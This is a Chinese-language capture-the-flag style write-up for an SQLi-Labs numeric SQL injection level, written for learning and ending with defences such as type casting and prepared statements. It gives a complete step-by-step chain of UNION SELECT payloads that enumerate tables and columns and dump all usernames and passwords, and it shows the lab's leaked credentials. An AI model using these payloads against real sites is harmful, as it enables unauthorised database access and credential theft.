## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：简单
- 通关标识：利用数字型注入漏洞，使用 UNION 联合查询出数据库中的所有账号密码。

## 二、大白话原理讲解
这关的柜员（后台数据库）和第一关是同一个，但他这次**只认数字，不认字符**。

第一关，我们递给他“查账户1**'**”，他因为引号不匹配脑子短路了。
这一关，如果我们递给他“查账户1**'**”，他直接把那张纸条撕了（报错 `near ' LIMIT 0,1'`），因为他的脑子里根本没有用来装单引号的“筐”。

既然他连引号都不需要，我们连“魔法咒语”都不用念了，直接递给他：“查账户-1，**顺便（UNION）** 把1,2,3打印给我”。
他连查都不查，直接把你需要的数字打印出来。接下来的套路，就和第一关完全一样了，直接掏空他的金库！

## 三、解题步骤

**1. 测试注入点并判断类型**
访问页面，URL 带上 `?id=1`，页面正常回显。
输入 `?id=1'`，页面报错：
`You have an error in your SQL syntax; ... near '' LIMIT 0,1' at line 1`
**分析**：注意报错信息，`near` 后面没有数字 `1` 了，说明单引号直接破坏了语法。这证明后台代码没有用引号包裹变量（`SELECT * FROM users WHERE id = $id`），属于**数字型注入**。不需要闭合引号。

**2. 确认列数（ORDER BY）**
因为是数字型，直接拼接：
```sql
?id=1 order by 1
?id=1 order by 2
?id=1 order by 3
?id=1 order by 4  (报错：Unknown column '4' in 'order clause')
```
**结论**：原查询结果共有 3 列。

**3. 寻找回显点（UNION SELECT）**
用 `-1` 让原查询报错，直接联合查询：
```sql
?id=-1 union select 1,2,3
```
**结论**：页面回显了 `2` 和 `3`。说明第 2 和第 3 列是回显点。

**4. 爆库、爆表、爆数据**
数字型注入不需要考虑闭合，直接拼：

*   **查当前数据库名**：
```sql
?id=-1 union select 1,database(),3
```
（回显库名为 `security`）

*   **查数据库下的表名**：
```sql
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'
```
（查出有 `users` 等表）

*   **查 `users` 表的字段名**：
```sql
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'
```
（查出有 `username`, `password` 等字段）

*   **最终爆出账号密码**：
```sql
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users
```
*(注：`0x3a` 依然是冒号的十六进制，用来分隔账号和密码)*

**5. 验证结果**
提交后，页面成功回显出了整张用户表的数据，例如：
```text
Your Login name: Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:...
```
成功获取所有用户的账号密码，通关。

## 四、知识点解析
1. **数字型注入（Numeric Injection）**：后台直接把输入的数字拼接到 SQL 语句中。不需要闭合引号，也无需注释符（如果后面有 LIMIT，可以通过 UNION 查空（`-1`）来规避）。
2. **UNION SELECT**：前后查询列数必须一致。
3. **回显点**：如果页面有回显，一定要先测试哪几列会被打印到屏幕上，这就是我们的“打印台”。
4. **GROUP_CONCAT**：将多行数据拼成一行显示，极大方便了数据的读取。

## 五、总结与防御
**本题总结**：
对于数字型注入，直接使用 `and` 或 `union` 拼接，无需考虑引号闭合，比字符型注入更直接。核心依旧是通过 `ORDER BY` 摸清列数，利用 `UNION` 找到回显点。

**安全防御建议**：
- **强制类型转换**：对于只应该是数字的参数，服务端用 `intval()` 强制转换（例如 `$id = intval($_GET['id'])`），直接杜绝注入。
- **预编译语句**：使用 PDO 或 MySQLi 将 SQL 语句和数据分离。
